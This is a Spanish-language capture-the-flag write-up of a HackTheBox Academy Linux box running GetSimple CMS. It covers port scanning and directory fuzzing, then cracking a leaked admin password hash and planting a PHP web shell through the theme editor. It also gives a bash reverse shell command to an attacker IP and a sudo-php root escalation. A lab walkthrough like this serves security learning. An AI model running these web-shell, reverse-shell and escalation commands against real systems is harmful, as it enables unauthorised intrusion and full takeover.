Propiedades:
- OS: Linux 
- Plataforma: HackTheBox Academy
- Nivel: Easy
- Tags: #file-upload #password-cracking
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad:
```bash
> ping -c 1 10.129.155.171
PING 10.129.155.171 (10.129.155.171) 56(84) bytes of data.
64 bytes from 10.129.155.171: icmp_seq=1 ttl=63 time=115 ms

--- 10.129.155.171 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 114.520/114.520/114.520/0.000 ms
```

Ahora procedo a tirar un escaneo con nmap para ver que puertos están abiertos
```bash
> nmap -p- -T5 --min-rate 5000 -Pn -n -vvv 10.129.155.171
---------------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-14 19:14 CST
Initiating Connect Scan at 19:14
Scanning 10.129.155.171 [65535 ports]
Discovered open port 80/tcp on 10.129.155.171
Discovered open port 22/tcp on 10.129.155.171
Warning: 10.129.155.171 giving up on port because retransmission cap hit (2).
Completed Connect Scan at 19:14, 14.27s elapsed (65535 total ports)
Nmap scan report for 10.129.155.171
Host is up, received user-set (0.11s latency).
Scanned at 2025-11-14 19:14:20 CST for 14s
Not shown: 65337 closed tcp ports (conn-refused), 196 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

- Puerto 80 HTTP y 22 SSH abiertos

Tiro un segundo escaneo para ver que servicios y versiones están corriendo en los puertos.
- Estamos contra un Ubuntu
```bash
> nmap -p 80,22 -sS -T5 -Pn -n -vvv -sC -sV 10.129.155.171 -oN target.txt
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyjE3IszCWTkwVItyz5yZxbgFhlqWM5o/4ZgDpPgt3QXKAawOgZbp7tSkTV7rVtI1pWlJf+o1c8Yo2MoIrlZVoYcKF3h35k12p+vzy3ZDqzF7jL2tJ95uYfk9WuKh1B8VLJegno2zkxYTzNzYGWrG1qkV61r2UjPYWzRVcHDRrNsxxgGpUF1AJcADWEModm3jpSksUGWUbgNqLoYTPYgFNBKeURrlABB8/ykIsqXLR3wVWIC5L8uslM4+qFGkCbdV+REUlBRzIdaC54lHeTF8JhShQnOuXgPdLp06slStSKcq+V/0gKhSDqm9TQITDNwglQm6ZkqQh0j0FaMt3GMwJB4N6eoGhceV3L7gOfmXd5UK2BYZqOOwiHTR6m+HIDKPdgOMTOCyDxVGCmuW6hu5GcOE0tO7ioU5p7vHTfw9jeyoCnXSNhpEY9JR2IKHlRaIPibfG1GUP0K09J/jaSCc2Eb2yW3r19V3F/6wI7iRbTyD3Hom90p0p6OyVKJyeh20=
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCL6NQmgxEaM6Pafc7ISrlPW491jht6Zf0Lvsb4P3DAbfT3j3h1fe74WgF2xG3FngdXDc40dkHVzfYpTqqCsNrU=
|   256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPfBXQPlIkQDU20q4l5MNZxG3ixQyUahJPci3gvdgKls
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 80 HTTP: Apache/2.4.41
- Puerto 22 SSH: OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
## Enumeración

**Puerto 80 HTTP**
![](assets/Pasted%20image%2020251114192029.png)

utilizamos `whatweb` para ver que tecnologías corre por detrás
- Nada interesante, ninguna version vieja para explotar.
```bash
> whatweb http://10.129.155.171/
http://10.129.155.171/ [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.155.171], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
```

Viendo el codigo fuente nos encontramos con esta URL la cual no nos llevaba a nada, por lo cual decidimos metarla al /etc/hosts: 
```bash
# URL
http://gettingstarted.htb/

> sudo nano /etc/hosts
10.129.155.171 gettingstarted.htb
```

Ahora la IP resuelve a este host:
![](assets/Pasted%20image%2020251114192555.png)

Procedo a realizar Fuzzing con `gobuster`
```bash
> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.155.171/ -x html,php,txt,py,js -t 20
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 5485]
/data                 (Status: 301) [Size: 315] [--> http://10.129.155.171/data/]
/admin                (Status: 301) [Size: 316] [--> http://10.129.155.171/admin/]
/plugins              (Status: 301) [Size: 318] [--> http://10.129.155.171/plugins/]
/theme                (Status: 301) [Size: 316] [--> http://10.129.155.171/theme/]
/readme.txt           (Status: 200) [Size: 1958]
/robots.txt           (Status: 200) [Size: 32]
/LICENSE.txt          (Status: 200) [Size: 35147]
```

**/themes**

En este directorio se almacenan los archivos de los temas, si por alguna razón yo consigo editar su codigo PHP tal vez pueda meter una web-shell

- Existen 2 temas instalados, Cardinal e Innovation y asi es como se ve la estructura los 2 tienen en común el archivo _template.php_
![](assets/Pasted%20image%2020251114194453.png)

**/data**

- Este directorio contiene informacion valiosa de usuarios
![](assets/Pasted%20image%2020251114193342.png)

**Credential Leak**

- Credenciales encontradas en `http://10.129.155.171/data/users/admin.xml`
- Al parecer son las credenciales del usuario admin
```xml
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
```

Me guardo el hash y decido romperlo con john
```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
> sudo john --show hash
?:admin

1 password hash cracked, 0 left
```

**/admin**
El recurso de /admin era un login al cual pude tener acceso mediante el leak de credenciales que habia en el directorio data
![](assets/Pasted%20image%2020251114193630.png)

## Explotación


Dentro del panel admin habia muchas opciones, entre ellas la que yo decidí explotar era el editor de temas. En nuestra fase de reconocimiento y enumeración nos dimos cuenta de que existía un directorio llamado **/themes**, entonces se me ocurrió ir al editor de temas y editar el archivo _template.php_ del tema _Innovation_ para obtener una web-shell
![](assets/Pasted%20image%2020251114194745.png)

Ahora, habiendo guardado el archivo podemos dirigirnos al path donde se guardan los temas para ver si nuestra web-shell funciona correctamente:

```bash
> http://10.129.155.171/theme/Innovation/template.php?cmd=whoami  # ?cmd=whoami es el comando ejecutado
```
Resultado:
![](assets/Pasted%20image%2020251114194917.png)

Ahora podemos proceder a entablarnos una reverse-shell

Nos ponemos en escucha con netcat
```bash
> sudo nc -nlvp 443
```

Ejecutamos el siguiente comando en la web-shell:
```bash
> ?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.114/443 0>%261'
```

Resultado:
```bash
Listening on 0.0.0.0 443
Connection received on 10.129.155.171 34628
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
www-data
www-data@gettingstarted:/var/www/html/theme/Innovation$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gettingstarted:/var/www/html/theme/Innovation$ 
```
## Escalada de Privilegios

Dentro del sistema, capturamos la primer flag user.txt en el directorio _/home//mrb3n_
```bash
> www-data@gettingstarted:/home$ cd mrb3n
cd mrb3n
www-data@gettingstarted:/home/mrb3n$ ls
ls

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

Con ayuda de GTFObins lo exploto para migrar al usuario root:

```bash
 www-data@gettingstarted:/ > sudo /usr/bin/php -r "system('/bin/bash');"
```

- Ya somos root
```bash
> whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

Ahora nos dirigimos al directorio /root para captura la siguiente flag
```bash
root@gettingstarted:/# cd root
root@gettingstarted:~# ls
root.txt  snap
root@gettingstarted:~# cat root.txt
f1fb......
```


***PWNED**